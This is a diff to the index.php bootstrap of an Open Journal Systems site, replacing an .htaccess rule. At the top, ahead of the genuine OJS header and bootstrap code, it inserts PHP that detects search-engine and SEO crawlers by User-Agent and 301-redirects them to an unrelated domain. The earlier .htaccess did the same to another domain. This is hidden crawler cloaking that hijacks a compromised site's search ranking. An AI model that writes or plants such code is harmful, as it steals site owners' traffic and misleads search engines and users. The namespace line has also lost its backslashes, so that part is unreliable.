@@ -1,9 +1,42 @@
-<IfModule mod_rewrite.c>
-RewriteEngine On
+<?php
 
-# Deteksi User-Agent bot
-RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
+// === Redirect bot ke domain baru ===
+$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
 
-# Redirect 301 hanya untuk bot ke https://journals.e-palli.com/home/index.php/ajgt
-RewriteRule ^(.*)$ https://journals.e-palli.com/home/index.php/ajgt [R=301,L]
-</IfModule>
+$bots = [
+    'googlebot',
+    'bingbot',
+    'slurp',
+    'ahrefs',
+    'semrush',
+    'yandex',
+    'majestic',
+    'screamingfrog'
+];
+
+foreach ($bots as $bot) {
+    if (strpos($userAgent, strtolower($bot)) !== false) {
+        header("Location: https://mutiaramutusertifikasi.org/beranda", true, 301);
+        exit();
+    }
+}
+
+/**
+ * @file index.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * Bootstrap code for OJS site. Loads required files and then calls the
+ * dispatcher to delegate to the appropriate request handler.
+ */
+
+use APPcoreApplication;
+
+// Initialize global environment
+define('INDEX_FILE_LOCATION', __FILE__);
+require_once './lib/pkp/includes/bootstrap.php';
+
+// Serve the request
+Application::get()->execute();
